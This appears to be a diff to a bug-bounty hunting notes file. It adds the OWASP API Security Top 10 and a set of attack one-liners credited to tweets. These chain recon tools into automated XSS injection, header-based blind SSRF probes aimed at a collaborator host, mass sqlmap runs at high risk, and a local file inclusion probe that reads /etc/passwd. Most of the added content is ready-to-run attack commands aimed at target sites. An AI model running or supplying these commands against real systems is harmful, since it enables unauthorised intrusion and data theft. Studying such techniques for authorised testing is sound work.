@@ -170,3 +170,56 @@ site:http://target.com inurl:auth
 site:http://target.com inurl:dev
 ```
 
+# 📅 26-Apr-2021
+## OWASP API Security Top 10
+1. API1:2019 — Broken object level authorization
+2. API2:2019 — Broken authentication
+3. API3:2019 — Excessive data exposure
+4. API4:2019 — Lack of resources and rate limiting
+5. API5:2019 — Broken function level authorization
+6. API6:2019 — Mass assignment
+7. API7:2019 — Security misconfiguration
+8. API8:2019 — Injection
+9. API9:2019 — Improper assets management
+10. API10:2019 — Insufficient logging and monitoring
+
+## Hacking OAuth Apps part - I
+- https://twitter.com/harshbothra_/status/1386528653136130048?s=20
+
+## Find XSS using dalfox
+cat subs.txt | waybackurl > wayback
+cat subs.txt | gau > wayback2
+cat subs.txt | hakrawler -depth 3 -plain > wayback3
+cat wayback wayback2 wayback3 | sort -u > wayback_full
+cat wayback_full | dalfox pipe -o result.txt
+
+## Check Blind ssrf in Header,Path,Host & check xss via web cache poisning.
+
+```sh
+cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
+```
+***Source : https://twitter.com/sratarun/status/1386628320406609921?s=20***
+
+## Bash tip of the day
+```sh
+awk '{print substr($0,2,length()-2);}'
+```
+Deletes first and last character from the supplied input strings
+
+## Reflected XSS Oneliner
+```sh
+waybackurls $target | grep '=' |qsreplace '"><svg/onload=alert(1337)>'| while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<svg/onload=alert(1337)>" && echo "$host \033[0;31m" Vulnerable;done
+```
+***Source : https://twitter.com/reewardius/status/1386369207412170755?s=20***
+
+## Oneliner to find SQLI in your target + subdomains
+```sh 
+python3 http://paramspider.py -d http://target.com -s TRUE -e woff,ttf,svg,eot | deduplicate --sort | sed '1,4d' | httpx -silent | sqlmap --level=5 --risk=3 
+```
+***source : https://twitter.com/LogicalHunter/status/1386622309344100358?s=20***
+
+## LFI Oneliner
+```sh
+gau $target | gf lfi | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+```
+***source : https://twitter.com/reewardius/status/1386347215849934848?s=20***
